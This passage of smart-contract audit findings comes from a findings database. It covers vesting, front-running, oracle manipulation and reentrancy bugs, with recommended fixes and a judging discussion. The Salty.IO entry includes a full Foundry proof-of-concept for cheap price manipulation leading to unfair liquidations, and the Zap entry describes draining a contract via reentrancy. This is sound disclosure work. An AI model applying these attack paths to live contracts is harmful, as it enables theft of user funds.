In the current architecture, a protocol has capital stored in strategies. Essentially, investing capital through the pool, the protocol mint own zun stablecoins in return. The capital the protocol held earns the rewards and the yield in the base scenario. Currently, the DAO explicitly withdraws the rewards and converts capital growth into `zun` stablecoins for withdrawal as well. In other words, it's the normal operation mode of the protocol where it constantly gains capital growth. However, in the event of a force majeure and if the protocol has an unsuccessful strategy where the token in which the capital is stored in an external protocol drops in price (for example, Curve LP token), the `DAO` initiate a recapitalization procedure to restore 100% backing selling stacked `zun` stablecoin and collected rewards. In the protocol, the period between losing full backing of own stablecoin with capital and its restoration is a standard procedure that cannot be fixed algorithmically because the problem lies in the external protocol, which has become imbalanced. And yes, users take on the risk that in the event of exiting the zunami pool (omni or APS), they may lose funds if capital is lost in an external project before the recapitalization happens.",Zunami Protocol,Oxorio,HIGH,,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Oxorio/2024-02-06-Zunami ProtocolV2.md,,,solodit_reports,,2024-04-18 21:11:30,2024-10-15 01:13:59,1,"_mint(address(this), gains);
```
            minted =",
1775088,9d152447b52664b496a217b43aac3cd6,Team members can't unstake the initial allocation forever.,Cyfrin,2024-04-14,"**Severity:** High

**Description:** When users call `unstake()`, it calculates the vested amount using `_vestingCheck()`.

```solidity
  function _vestingCheck(address user, uint256 amount) internal view returns (uint256) {
    if(teamAllocations[user] > 0) return 0; //@audit return 0 for team members
    uint256 initialAllocation = seedAllocations[user];
    if(initialAllocation > 0) {
      if(block.timestamp < vestingStart) return 0;
      uint256 vestPortion = FixedPointMathLib.divWad(block.timestamp - vestingStart, vestingEnd - vestingStart);
      return FixedPointMathLib.mulWad(vestPortion, initialAllocation) - (initialAllocation - stakedLocks[user]);
    }
    else {
      return amount;
    }
  }
```

But it returns 0 for team members and they can't unstake forever.
Furthermore, in `stake()`, it just prevents seed investors, not team members. So if team members have staked additionally, they can't unstake also.

**Impact:** Team members can't unstake forever.

**Recommended Mitigation:** `_vestingCheck` should use the same logic as initial investors for team mates.

**Client:** Acknowledged, it is intended that the team cannot unstake their tokens. [PR #4](https://github.com/0xgeeb/goldilocks-core/pull/4) fixes issue of `stake` not preventing team members from staking.

**Cyfrin:** Verified.",Goldilocks,Hans,HIGH,,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-04-14-cyfrin-goldilocks-v1.1.md,,,solodit_reports,,2024-04-18 21:11:42,2024-10-15 01:45:40,1,,
1775206,7cf20dad3240dd2f513b331652f21fd2,[H-01] `createVestingSchedule` can be front-ran by another holder of `ROLE_CREATE_SCHEDULE` role,Pashov,2023-11-01,"**Severity**

**Impact:**
High, as vesting token balance can be stolen

**Likelihood:**
Medium, as it requires front-running

**Description**

The `createVestingSchedule` method of `TokenVestingV2` expects to have a pre-transferred balance before initializing a vesting schedule. The problem with the current contract version is that multiple accounts can hold the `ROLE_CREATE_SCHEDULE` role. Since two transactions are expected to create a vesting schedule (transferring funds to the `TokenVestingV2` contract and then calling `createVestingSchedule`) this means that between them another holder of the role can come in and create a vesting schedule of his own (with himself as beneficiary for example, non-revokable with just 7 days of duration) and in this way steal the funds of the other role holder.

**Recommendations**

Either change `createVestingSchedule` to itself transfer the vesting schedule tokens from the caller to the contract or make it callable by just 1 address",yHairVesting,Pashov,HIGH,,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-11-01-yHairVesting.md,,,solodit_reports,,2024-04-22 21:11:22,2024-04-29 10:34:59,1,,
1775267,0333e05811ac2754b9e7a9f0940952dc,[H-03] The use of spot price by CoreSaltyFeed can lead to price manipulation and undesired liquidations,Code4rena,2024-01-16,"When the price moves, Chainlink instantly reports the spot price, while the TWAP slowly changes the price. The spot price of CoreSaltyFeed can be manipulated, allowing an attacker to move the price in a desired direction.

### Vulnerability Details

1.  The spot price of `CoreSaltyFeed` can be manipulated, even when considering automatic arbitrage. The cost of moving the price depends on the liquidity of the pools. While the protocol is small, it will be cheap to manipulate, but even as it grows, the cost won't become prohibitively expensive.
    If all the pools have `2*1_000` ETH of value each, the attack will cost only \~0.0036 ETH to move a price by 3%, and \~0.0363 ETH to move it by 10%.
    Refer to the PoCs for the estimated cost of the attack.

2.  Assume the WBTC/USD price moves 3%, from $40,000 to $38,800. Chainlink updates instantly, but the TWAP takes some time. You can see my calculations of the TWAP price change [here](https://docs.google.com/spreadsheets/d/e/2PACX-1vS_WU8z_MOikvCSnGjFLAFpVcOHcti2k82v0b8K4U3tNvXFuA61\_YedRqmQ6qgJaeiY1YnMulz5uauX/pubhtml).

3.  `CoreSaltyFeed` WBTC/USDS price will be adjusted to match Chainlink's price by arbitrageurs.

4.  `CoreSaltyFeed` returns $38,800, Chainlink returns $38,800, TWAP returns $40,000.

5.  The attacker moves the `CoreSaltyFeed` price \~3%, but less than the difference between TWAP and Chainlink, to $38,000.

6.  As shown in the PoC, it will cost the attacker only 0.0035 ETH if the pools have 1000 ETH of liquidity, but if they have 100 ETH, it will require only \~0.0004 ETH.

7.  The difference between `CoreSaltyFeed` and Chainlink is $800, and from TWAP and Chainlink it's $1,200.

8.  The [average price](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/price_feed/PriceAggregator.sol#L139) is set to ($38,000 + $38,800) / 2 = $38,400.

9.  Now the attacker can liquidate pools that should not be liquidatable because the price from PriceAggregator is lower than the real price. The attacker can do it first and get the rewards (5%, up to $500 by default). See the relevant code [here](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L171-L173).

    ```solidity
    // Reward the caller
    wbtc.safeTransfer( msg.sender, rewardedWBTC );
    weth.safeTransfer( msg.sender, rewardedWETH );
    ```

10. `maxRewardValueForCallingLiquidation` is set to $500. Depending on Salty's pool liquidity, ETH price, and how many positions an attacker can liquidate, profitability will vary. I argue that before the protocol gains traction, liquidity will be low for some time, making the attack profitable.

11. We should also consider that sometimes it will be profitable for the attacker to move the price slightly and be the first to call `liquidate` in order to receive the rewards.

12. Other liquidators, who don't use this attack, will not be able to liquidate, which is unfair.

Note: WBTC and WETH movements of 3% are common and will happen often. For example, about a month ago, there was a 6.5% drop in 20 minutes as reported by [Business Insider](https://markets.businessinsider.com/news/currencies/bitcoin-price-cryptocurrency-rally-crash-eth-btc-token-crypto-cpi-2023-12).

 **Variations**

1.  If the Chainlink oracle fails to update prices on time (due to block stuffing before the heartbeat or Chainlink DAO turning it off, as described [here](https://medium.com/hackernoon/the-anatomy-of-a-block-stuffing-attack-a488698732ae) and [here](https://medium.com/cyfrin/chainlink-oracle-defi-attacks-93b6cb6541bf#e100)), the attack becomes easier as a 3% price change in the market will not be necessary.
2.  In the event of a sudden crash in BTC and/or ETH, an attacker could mint undercollateralized USDS. The 200% collateral requirement, set in `StableConfig.initialCollateralRatioPercent` and calculated using the outdated TWAP price along with the manipulated `CoreSaltyFeed`, would be ineffective as protection against this attack when the real price has already dropped below 100%.
3.  During a sudden crash of BTC and/or ETH, [the oracle price feed may continue to report the incorrect minimum price](https://medium.com/cyfrin/chainlink-oracle-defi-attacks-93b6cb6541bf#00ac). This can again lead to the minting of undercollateralized USDS.

### Impact

1.  Positions that should not be liquidated are liquidated => unexpected liquidation and loss of part of collateral for a borrower (on fees)
2.  Honest liquidators who don't move the price won't be able to liquidate because an attacker will move the price and liquidate in the same transaction

### Proof of Concept

Put the code in `src/pools/tests/H2.t.sol`, run `COVERAGE=""yes"" forge test -f wss://ethereum-sepolia.publicnode.com -vvv --mc H2`

<details>

```solidity
// SPDX-License-Identifier: BUSL 1.1
pragma solidity =0.8.22;

import ""../../dev/Deployment.sol"";
import ""../PoolUtils.sol"";


contract H2 is Deployment
	{
    TestERC20 immutable tokenA;
    TestERC20 immutable tokenB;
    address ALICE = address(0x1111);
    address BOB = address(0x2222);

    	    constructor()
		{
            initializeContracts();

            grantAccessAlice();
            grantAccessBob();
            grantAccessCharlie();
            grantAccessDeployer();
            grantAccessDefault();

            finalizeBootstrap();

            vm.startPrank(address(daoVestingWallet));
            salt.transfer(DEPLOYER, 1000000 ether);
            salt.transfer(address(collateralAndLiquidity), 1000000 ether);
            vm.stopPrank();

            vm.startPrank( DEPLOYER );
            tokenA = new TestERC20(""TOKENA"", 18);
            tokenB = new TestERC20(""TOKENB"", 18);
            vm.stopPrank();
            _prepareToken(tokenA);
            _prepareToken(tokenB);
            _prepareToken(weth);

            vm.stopPrank();
            vm.prank(address(dao));
            poolsConfig.whitelistPool( pools, tokenA, tokenB );
            vm.stopPrank();

		}

        // Make the required approvals and transfer to Bob and Alice.
        function _prepareToken(IERC20 token) internal {
            vm.startPrank( DEPLOYER );
            token.approve( address(pools), type(uint256).max );
            token.approve( address(collateralAndLiquidity), type(uint256).max );
            // For WBTC, we can't use 'ether', so we use 10**8.
            uint decimals = TestERC20(address(token)).decimals();
            token.transfer(ALICE, 1_000_000 * (10**decimals));
            token.transfer(BOB, 1_000_000 * (10**decimals));

            vm.startPrank(ALICE);
            token.approve( address(pools), type(uint256).max );
            token.approve( address(collateralAndLiquidity), type(uint256).max );

            vm.startPrank(BOB);
            token.approve( address(pools), type(uint256).max );
            token.approve( address(collateralAndLiquidity), type(uint256).max );
            vm.stopPrank();
        }

        // Create pools that will participate in arbitrage
        // Note: We have all required pools for successful arbitrage, see ArbitrageSearch::_arbitragePath 
        // swap: swapTokenIn->WETH
        // arb: WETH->swapTokenIn->WBTC->WETH
        // We have: tokenA/WETH, tokenA/WBTC, WBTC/WETH
        function _makeArbitragePossible(uint amountToDeposit) internal {
            // based on Pools.t.sol::testDepositDoubleSwapWithdraw
            vm.startPrank(DEPLOYER);

            wbtc.approve(address(collateralAndLiquidity), type(uint256).max );
            weth.approve(address(collateralAndLiquidity), type(uint256).max );
            tokenA.approve(address(collateralAndLiquidity), type(uint256).max );
            tokenB.approve(address(collateralAndLiquidity), type(uint256).max );
            tokenA.approve(address(pools), type(uint256).max );

            vm.warp(block.timestamp + stakingConfig.modificationCooldown());
            collateralAndLiquidity.depositCollateralAndIncreaseShare(
                amountToDeposit * 10**8, amountToDeposit * 1 ether, 0, block.timestamp, false
            );
            vm.stopPrank();

            vm.startPrank(address(dao));
            poolsConfig.whitelistPool( pools, tokenA, wbtc);
            poolsConfig.whitelistPool( pools, tokenA, weth);
            poolsConfig.whitelistPool( pools, tokenB, wbtc);
            poolsConfig.whitelistPool( pools, tokenB, weth);
            vm.stopPrank();

            vm.startPrank(DEPLOYER);
            collateralAndLiquidity.depositLiquidityAndIncreaseShare(
                tokenA, wbtc, amountToDeposit * 1 ether, amountToDeposit * 10**8, 0, 
                block.timestamp, false
            );
            collateralAndLiquidity.depositLiquidityAndIncreaseShare(
                tokenB, wbtc, amountToDeposit * 1 ether, amountToDeposit * 10**8, 0, 
                block.timestamp, false
            );
            collateralAndLiquidity.depositLiquidityAndIncreaseShare(
                tokenA, weth, amountToDeposit * 1 ether, amountToDeposit * 1 ether, 0, 
                block.timestamp, false
            );
            collateralAndLiquidity.depositLiquidityAndIncreaseShare(
                tokenB, weth, amountToDeposit * 1 ether, amountToDeposit * 1 ether, 0, 
                block.timestamp, false
            );

            vm.stopPrank();
        }

        function _getReservesAndPrice(IERC20 _tokenA, IERC20 _tokenB) internal view returns (
            string memory _tokenASymbol, string memory _tokenBSymbol, 
            uint reserveA, uint reserveB, uint priceBinA
        ) {
            (reserveA, reserveB) = pools.getPoolReserves(_tokenA, _tokenB);
            _tokenASymbol = TestERC20(address(_tokenA)).symbol();
            _tokenBSymbol = TestERC20(address(_tokenB)).symbol();
            uint8  _tokenADecimals = TestERC20(address(_tokenA)).decimals();
            uint8  _tokenBDecimals = TestERC20(address(_tokenB)).decimals();

            // reserveA / reserveB  || b.decimals - a.decimals  || normalizer
            // 1e8/1e18             || diff 10                  || 1e28
            // 1e18/1e18            || diff 0                   || 1e18
            // 1e18/1e8             || diff -10                 || 1e8
            int8 decimalsDiff = int8(_tokenBDecimals) - int8(_tokenADecimals);
            uint normalizerPower = uint8(int8(18) + decimalsDiff);
            uint normalizer = 10**normalizerPower;

            // price with precision 1e18
            priceBinA = reserveB == 0 
                    ? 0 
                    : ( reserveA * normalizer ) / reserveB;
        }

        function _printReservesAndPriceFor(IERC20 _tokenA, IERC20 _tokenB) internal view 
        {
            (
                string memory _tokenASymbol, 
                string memory _tokenBSymbol, 
                uint reserveA, 
                uint reserveB, 
                uint priceBinA
            ) = _getReservesAndPrice(_tokenA, _tokenB);

            console2.log(""%s reserves: %e"", _tokenASymbol , reserveA);
            console2.log(""%s reserves: %e"", _tokenBSymbol, reserveB);
            console2.log(""%s price in %s: %e"", _tokenBSymbol, _tokenASymbol, priceBinA);
            console.log("""");
        }


        // Extracted some local variables to storage due to too many local variables.
        struct MovePriceParams {
            uint amountToExchange;
            uint expectedMovementPercents; 
            uint expectedLoss;
        }
        uint gasBefore = 1; // Set to 1 to save gas on updates and obtain more accurate gas estimations.
        uint stepsCount;

        // Splitting a swap into several steps will significantly reduce slippage.
        // More steps will further reduce slippage, thereby decreasing the cost of the attack.
        // However, too many steps can incur high gas costs; for instance, 100 steps will cost approximately 3+4=7 million gas (as indicated in the console.log output).
        uint constant steps = 100;
        function _movePrice(MovePriceParams memory p) internal {
            /* Before the attack */
            console.log(""\n%s"", ""__BEFORE"");

            // Check price before
            (,,,,uint priceBefore) = _getReservesAndPrice(tokenA, weth);
            assertEq(1 ether, priceBefore); // price is 1:1

            _printReservesAndPriceFor(tokenA, weth);
            uint wethBefore = weth.balanceOf(ALICE);
            uint tokenABefore = tokenA.balanceOf(ALICE);
            console2.log(""weth.balanceOf(ALICE): %e"", wethBefore);
            console2.log(""tokenA.balanceOf(ALICE): %e"", tokenABefore);

            /* Move the price */
            vm.startPrank(ALICE);

            gasBefore = gasleft();
            for (uint i; i < steps; i++){
                pools.depositSwapWithdraw(tokenA, weth, p.amountToExchange/steps, 0, block.timestamp + 300);
            }
            console.log(""Gas first(for) loop: "", gasBefore - gasleft());


            /* After the attack */
            console.log(""\n%s"", ""__AFTER"");

            // Console.log the output
            _printReservesAndPriceFor(tokenA, weth);
            uint wethAfter = weth.balanceOf(ALICE);
            uint tokenAAfter = tokenA.balanceOf(ALICE);
            console2.log(""weth.balanceOf(ALICE): %e"", weth.balanceOf(ALICE));
            console2.log(""tokenA.balanceOf(ALICE): %e"", tokenA.balanceOf(ALICE));
            uint wethGained = wethAfter - wethBefore;
            uint tokenALost = tokenABefore - tokenAAfter;
            console2.log(""weth.balanceOf(ALICE) diff: %e"", wethGained);
            console2.log(""tokenA.balanceOf(ALICE) diff: %e"", tokenALost);
            // Note: Since the price of tokenA and WETH are the same at the start, with a 1:1 ratio, 
            // we can subtract and add them as equivalent values.
            uint attackPrice = tokenALost - wethGained;
            console2.log(""Losses for the attacker (before swapping back): %e"", attackPrice);

            // Assert that the attack was successful and inexpensive.
            (,,,,uint priceAfter) = _getReservesAndPrice(tokenA, weth);
            uint priceDiff = priceAfter - priceBefore;
            assertTrue(priceDiff >= p.expectedMovementPercents * 1 ether / 100);

            /* The attacker can further reduce the cost by exchanging back. */
            /* After the exchange, the price is moved back. */
            console.log(""\n%s"", ""__AFTER_EXCHANGING_BACK"");
            (,,,,uint currentPrice) = _getReservesAndPrice(tokenA, weth);
            uint step = p.amountToExchange/steps;
            gasBefore = gasleft();
            while (currentPrice > 1 ether){
                pools.depositSwapWithdraw(weth, tokenA, step, 0, block.timestamp);
                (,,,,currentPrice) = _getReservesAndPrice(tokenA, weth);
                stepsCount++;
            }

            // Console.log the output
            console2.log(""Gas second(while) loop: "", gasBefore - gasleft());
            console2.log(""stepsCount"", stepsCount);
            _printReservesAndPriceFor(tokenA, weth);
            uint wethAfterBalancing = weth.balanceOf(ALICE);
            uint tokenAAfterBalancing = tokenA.balanceOf(ALICE);
            console2.log(""weth.balanceOf(ALICE): %e"", weth.balanceOf(ALICE));
            console2.log(""tokenA.balanceOf(ALICE): %e"", tokenA.balanceOf(ALICE));
            int wethDiff = int(wethAfterBalancing) - int(wethBefore);
            int tokenADiff = int(tokenAAfterBalancing) - int(tokenABefore);
            console2.log(""weth.balanceOf(ALICE) diff: %e"", wethDiff);
            console2.log(""tokenA.balanceOf(ALICE) diff: %e"", tokenADiff);
            // Note: Since the price of tokenA and WETH are the same at the start, with a 1:1 ratio, 
            // we can subtract and add them as equivalent values.

            int sumDiff = wethDiff + tokenADiff;
            console2.log(""Diff (positive=profit) for the attacker: %e"", sumDiff);
            console2.log(""Arbitrage profits for DAO: %e"", pools.depositedUserBalance(address(dao), weth ));
        }

    function testMovePrice10PercentsFor1000EtherPools() public
		{
            _makeArbitragePossible(1_000);
            _movePrice(MovePriceParams(75 ether, 10, 0.0363 ether));
		}

    function testMovePrice3PercentsFor1000EtherPools() public
		{
            _makeArbitragePossible(1_000);
            _movePrice(MovePriceParams(23 ether, 3, 0.0036 ether));
		}

    function testMovePrice3PercentsFor100EtherPools() public
		{
            _makeArbitragePossible(100);
            _movePrice(MovePriceParams(2.3 ether, 3, 0.0004 ether));
		}

    function testMovePrice3PercentsFor10EtherPools() public
		{
            _makeArbitragePossible(10);
            _movePrice(MovePriceParams(0.23 ether, 3, 0.00008 ether));
		}
}
```
</details>

(Optional) You can place this AWK script in `1e18.sh`, make it executable with `chmod +x 1e18.sh`, and run `COVERAGE=""yes"" forge test -f wss://ethereum-sepolia.publicnode.com -vvv --mc M2 | ./1e18.sh` for a more readable output. This script will convert numbers in exponential notation to a floating point format with three decimal places. For example, `1e17` will be printed as `0.100`.

```sh
#!/bin/bash

awk '{
    for(i=1; i<=NF; i++) {
        if ($i ~ /[0-9]+e[+-]?[0-9]+/) {
            $i = sprintf(""%.3f"", $i / 1e18)
        }
    }
    print $0
}'

```
### Recommended Mitigation Steps

Consider replacing `CoreSaltyFeed` with a different oracle that provides better protection against manipulation, like Band Protocol.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/609#issuecomment-1947988990):**
 > Note: the overcollateralized stablecoin mechanism has been removed from the DEX.
> 
> https://github.com/othernet-global/salty-io/commit/f3ff64a21449feb60a60c0d60721cfe2c24151c1

 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:
> 
> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9
> 

**Status:** Mitigation confirmed. Full details in reports from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/31), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/63), and [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/43).

***",Salty.IO,linmiaomiao|n1punp|OMEN|J4X|Banditx0x|00xSEV|Myrault|miaowu|jesjupyter|CongZhang-CertiK,HIGH,,80000,0,5,1,https://github.com/code-423n4/2024-01-salty-findings/issues/609,https://code4rena.com/reports/2024-01-salty,,https://code4rena.com/reports/2024-01-salty,solodit_reports,327484da0e64097f328c340cfdc48251,2024-04-22 21:11:58,2024-10-15 01:04:47,1,"uint256 averagePrice = ( priceA + priceB ) / 2;
```
		// Reward the caller
		wbtc.safeTransfer( msg.sender, rewardedWBTC );
		weth.safeTransfer( msg.sender, rewardedWETH );",
1775490,e13afdc3ba9c76d87984d5b8351380ab,H-3: Reentrancy in Vesting.sol:claim() will allow users to drain the contract due to executing .call() on user's address before setting s.index = uint128(i),Sherlock,2024-03-20,"# Issue H-3: Reentrancy in Vesting.sol:claim() will allow users to drain the contract due to executing .call() on user's address before setting s.index = uint128(i) 

Source: https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/157 

## Found by 
0x4non, 0xR360, 0xhashiman, 404666, AMOW, BengalCatBalu, HonorLt, Silvermist, UbiquitousComputing, Varun\_05, ZdravkoHr., aman, bughuntoor, cats, cawfree, denzi\_, dipp, enfrasico, klaus, mike-watson, nilay27, no, novaman33, psb01, s1ce, thank\_you, turvec
## Summary
Reentrancy in Vesting.sol:claim() will allow users to drain the contract due to executing .call() on user's address before setting s.index = uint128(I)

## Vulnerability Detail
Here is the Vesting.sol:claim() function:
```solidity
function claim() external {
        address sender = msg.sender;

        UserDetails storage s = userdetails[sender];
        require(s.userDeposit != 0, ""No Deposit"");
@>      require(s.index != vestingPoints.length, ""already claimed"");
        uint256 pctAmount;
        uint256 i = s.index;
        for (i; i <= vestingPoints.length - 1; i++) {
            if (block.timestamp >= vestingPoints[i][0]) {
                pctAmount += (s.userDeposit * vestingPoints[i][1]) / 10000;
            } else {
                break;
            }
        }
        if (pctAmount != 0) {
            if (address(token) == address(1)) {
@>              (bool sent, ) = payable(sender).call{value: pctAmount}("""");
                require(sent, ""Failed to send BNB to receiver"");
            } else {
                token.safeTransfer(sender, pctAmount);
            }
@>          s.index = uint128(i);
            s.amountClaimed += pctAmount;
        }
    }
```
From the above, You'll notice the claim() function checks if the caller already claimed by checking if the s.index has already been set to vestingPoints.length. You'll also notice the claim() function executes .call() and transfer the amount to the caller before setting the s.index = uint128(i), thereby allowing reentrancy.

Let's consider this sample scenario:
- An attacker contract(alice) has some native pctAmount to claim and calls `claim()`.
- ""already claimed"" check will pass since it's the first time she's calling `claim()` so her s.index hasn't been set
- However before updating Alice s.index, the Vesting contract performs external .call() to Alice with the amount sent as well
- Alice reenters `claim()` again on receive of the amount
- bypass index ""already claimed"" check since this hasn't been updated yet
- contract performs external .call() to Alice with the amount sent as well again,
- Same thing happens again
- Alice ends up draining the Vesting contract

## Impact
Reentrancy in Vesting.sol:claim() will allow users to drain the contract

## Code Snippet
https://github.com/sherlock-audit/2024-03-zap-protocol/blob/main/zap-contracts-labs/contracts/Vesting.sol#L84
https://github.com/sherlock-audit/2024-03-zap-protocol/blob/main/zap-contracts-labs/contracts/Vesting.sol#L89

## Tool used

Manual Review

## Recommendation
Here is the recommended fix:
```diff
if (pctAmount != 0) {
+           s.index = uint128(i);
            if (address(token) == address(1)) {
                (bool sent, ) = payable(sender).call{value: pctAmount}("""");
                require(sent, ""Failed to send BNB to receiver"");
            } else {
                token.safeTransfer(sender, pctAmount);
            }
-           s.index = uint128(i);
            s.amountClaimed += pctAmount;
        }
```
I'll also recommend using reentrancyGuard.



## Discussion

**midori-fuse**

Escalate 

Per Sherlock's [duplication rule](https://docs.sherlock.xyz/audits/judging/judging#ix.-duplication-rules):

> In the above example if the root issue A is one of the following generic vulnerabilities:
> - Reentrancy
> - Access control
> - Front-running
>
> Then the submissions with valid attack paths and higher vulnerability are considered valid. If the submission is vague or does not identify the attack path with higher severity clearly it will be considered low.
> - B is a valid issue
> - C is low

The following submissions fail to and/or incorrectly identify the root cause that enables the attack path: #6 #34 #66 #68 #79 #90 #98 #132 #149  . 
- The issues in this category should be Low.

The following submissions are somewhat vague, but did manage to identify the erroneous storage variable that leads to re-entrancy (`s.index`): #10 #53 #104 #138 #186 (and a few more). 
- While they did not (or vaguely) described the ""attack path"", the attack path here is just ""directly calling `claim()` in your `receive()`"", so I suppose one can be ok with just spelling out the function and the wrong storage variable.
- Since submission quality is subjective, I am flagging these issues so the judges can help with reviewing dupes. Personally I think these submissions are still acceptable, but leaving to the judges to decide the where the bar is.

**sherlock-admin2**

> Escalate 
> 
> Per Sherlock's [duplication rule](https://docs.sherlock.xyz/audits/judging/judging#ix.-duplication-rules):
> 
> > In the above example if the root issue A is one of the following generic vulnerabilities:
> > - Reentrancy
> > - Access control
> > - Front-running
> >
> > Then the submissions with valid attack paths and higher vulnerability are considered valid. If the submission is vague or does not identify the attack path with higher severity clearly it will be considered low.
> > - B is a valid issue
> > - C is low
> 
> The following submissions fail to and/or incorrectly identify the root cause that enables the attack path: #6 #34 #66 #68 #79 #90 #98 #132 #149  . 
> - The issues in this category should be Low.
> 
> The following submissions are somewhat vague, but did manage to identify the erroneous storage variable that leads to re-entrancy (`s.index`): #10 #53 #104 #138 #186 (and a few more). 
> - While they did not (or vaguely) described the ""attack path"", the attack path here is just ""directly calling `claim()` in your `receive()`"", so I suppose one can be ok with just spelling out the function and the wrong storage variable.
> - Since submission quality is subjective, I am flagging these issues so the judges can help with reviewing dupes. Personally I think these submissions are still acceptable, but leaving to the judges to decide the where the bar is.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**Nilay27**

> Escalate
> 
> Per Sherlock's [duplication rule](https://docs.sherlock.xyz/audits/judging/judging#ix.-duplication-rules):
> 
> > In the above example if the root issue A is one of the following generic vulnerabilities:
> > 
> > * Reentrancy
> > * Access control
> > * Front-running
> > 
> > Then the submissions with valid attack paths and higher vulnerability are considered valid. If the submission is vague or does not identify the attack path with higher severity clearly it will be considered low.
> > 
> > * B is a valid issue
> > * C is low
> 
> The following submissions fail to and/or incorrectly identify the root cause that enables the attack path: #6 #34 #66 #68 #79 #90 #98 #132 #134 #149 .
> 
> * The issues in this category should be Low.
> 
> The following submissions are somewhat vague, but did manage to identify the erroneous storage variable that leads to re-entrancy (`s.index`): #10 #53 #104 #138 #186 (and a few more).
> 
> * While they did not (or vaguely) described the ""attack path"", the attack path here is just ""directly calling `claim()` in your `receive()`"", so I suppose one can be ok with just spelling out the function and the wrong storage variable.
> * Since submission quality is subjective, I am flagging these issues so the judges can help with reviewing dupes. Personally I think these submissions are still acceptable, but leaving to the judges to decide the where the bar is.

#134 identifies the issue of how the re-entrance occurs and suggests the same remediation.
It clearly explains the following:
""The vulnerability arises from the contract's failure to update a user's claim state (s.index and s.amountClaimed) before transferring funds to the user, which allows a malicious contract to receive the funds and re-enter the claim function before the original call completes, potentially claiming more funds repeatedly.""

The recommendation suggests updating the state before or using a reentrancy guard.

 I am unsure why that has been included in the `low` category per your escalation?  

**midori-fuse**

@Nilay27 I suppose you are right. Sorry about that, there are just too many dupes here, I might have confused it with another issue that got lost somewhere.

But be assured that unless the head of judging downright disagrees with me, all dupes will be reviewed and judged accordingly. Once again I'm sorry for my mistake.

**novaman33**

My issue - #10 does show the root cause clearly and does suggest a thorough recommendation for the mitigation. I do not agree it is vague. 

**keesmark**

It is the same as this one, but why is it considered invalid? #119 

**novaman33**

Probably because #119 says that reentrancy will occur when transferring erc20 tokens while call is used to transfer eth.


**ZdravkoHr**

Also, BNB is out of scope

**Hash01011122**

Acknowledging that every mentioned issue accurately identifies both the root cause of the vulnerability and the correct attack paths, yet noting the straightforward nature of the issue as a reason for minimal effort in Watson's issue, suggests a potential oversight in the importance of comprehensive reporting. 

**shubham-antier**

Issue resolved: Moved the updations above the transfers. Also, added a reentrancy guard to better the security.

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/Lithium-Ventures/zap-contracts-labs/pull/2.

**Evert0x**

@Hash01011122 what's your proposal on the exact family for this issue? Which reports should be excluded/included?

**Hash01011122**

@Evert0x Had a indepth review of this family of issues:
Issues which can be excluded are: #6, #10, #34, #66, #79, #90, #132, #138, #149.
The pinpoint the root cause but fail to explain any attack vector.

**armormadeofwoe**

> @Evert0x Had a indepth review of this family of issues: Issues which can be excluded are: #6, #10, #34, #66, #79, #90, #132, #138, #149. The pinpoint the root cause but fail to explain any attack vector.

Hi @Hash01011122, with all due respect, I believe #138 should remain valid since it showcases:
root cause - sending funds before updating variables (breach of CEI pattern)
attack path - the ability to trigger an arbitrary fallback function due to sending native ETH that could re-enter the same function and continue claiming funds due to the unchanged variables. 

I do agree that my report is a little short as this is arguably the most known and recognizable issue in this space, decided to spare the judges some extra reading.



**Hash01011122**

Imao #138 should be excluded as I mentioned above,

**0x3agle**

@Hash01011122 
#6 accurately identifies the root cause and the attack path.
Root cause:
> If the token == address(1) (i.e. the native token) it performs an external call which sends the token to msg.sender and then updates the storage variable.

Attack Path:
> This allows an attacker to reenter the claim function until the contract is drained completely.

**Hash01011122**

@0x3agle with all due respect your report doesn't mention any appropriate Attack Path.

**0x3agle**

@Hash01011122 

Issue: storage variable updated after external call
Attack path: reentering the claim function
Impact: Contract drained
Mitigation: Follow CEI, add non-reentrant

Isn't this enough for this issue to be considered a valid one? 

This issue is so obvious I didn't feel the need for a PoC to convey my point. 

Having said that, I respect your decision and will accept it. 

**Hash01011122**

Hey, if we look from that lens even issues like #10, #34, #66, #132 and #138 should be valid too. I understand what you are pointing even I don't want to invalidate any of the issues as I understand watson's would not spend more effort on writing low hanging fruit issues, However, I'm just adhering to Sherlock's rulebook. Do you want to add anything here @0x3agle?

**Evert0x**

> @Evert0x Had a indepth review of this family of issues: Issues which can be excluded are: #6, #10, #34, #66, #79, #90, #132, #138, #149. The pinpoint the root cause but fail to explain any attack vector.

Planning to accept escalation and move remove the reports mentioned by the Lead Judge as duplicates

**0x3agle**

@Hash01011122 @Evert0x 
You missed #53 and #104

*P.S. I'm not a fan of pulling down other reports but if a selected portion of reports are being disqualified because they didn't mention a ""detailed"" attack path for an obvious issue, then every report that did not include a detailed description/PoC should be considered for disqualification.*

**novaman33**

@Evert0x could you please identify how #10 fails to explain the attack vector. I believe the attack path is stated clearly and that the solution is also very detailed. 


**Hash01011122**

Agreed, @0x3agle we can add those issues in our list. Updated issues to get excluded will be:
#6, #10, #34, #53, #66, #79, #90, #104, #132, #138, #149 

**Hash01011122**

@novaman33 I don't see any valid attack path mentioned in #10 report.

**Evert0x**

I believe #10 identified the attack pack and shows a good understanding of the issue.

After taken a detailed look at all reports, I believe only the following ones should be excluded as all other reports pinpoint the exact logic in the code that allows the reentrancy to happen. 

